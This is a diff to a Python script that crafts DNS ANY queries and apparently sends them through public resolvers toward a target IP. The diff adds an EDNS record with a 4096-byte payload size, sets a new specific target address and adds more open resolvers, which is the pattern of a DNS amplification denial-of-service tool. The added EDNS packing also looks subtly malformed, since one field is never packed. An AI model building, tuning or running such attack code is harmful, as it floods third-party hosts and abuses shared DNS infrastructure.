@@ -12,12 +12,26 @@ def create_dns_query(domain):
     questions = 1
     answer_rrs = 0
     authority_rrs = 0
-    additional_rrs = 0
+    additional_rrs = 1 
     query = struct.pack(">HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
+
     query_name = b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'
+    
     query_type = 255  # ANY record
-    query_class = 1 # IN (Internet)
+    query_class = 1   # IN (Internet)
+    
     query += query_name + struct.pack(">HH", query_type, query_class)
+    
+    edns_name = 0
+    edns_type = 41  # EDNS OPT record
+    edns_udp_payload_size = 4096
+    edns_extended_rcode = 0
+    edns_edns_version = 0
+    edns_z = 0
+    edns_data_length = 0
+
+    query += struct.pack(">BHHBBH", edns_name, edns_type, edns_udp_payload_size, edns_extended_rcode, edns_edns_version, edns_data_length)
+    
     return query
 
 def is_valid_ip(ip):
@@ -77,8 +91,8 @@ def worker(target_ip, dns_server, domain):
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO, filename='dns.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s')
 
-    target_ip = "172.64.152.115"
-    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
+    target_ip = "186.249.231.34"
+    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26"]
     domain = "facebook.com"
     interval = 0.1  # seconds
     running = True
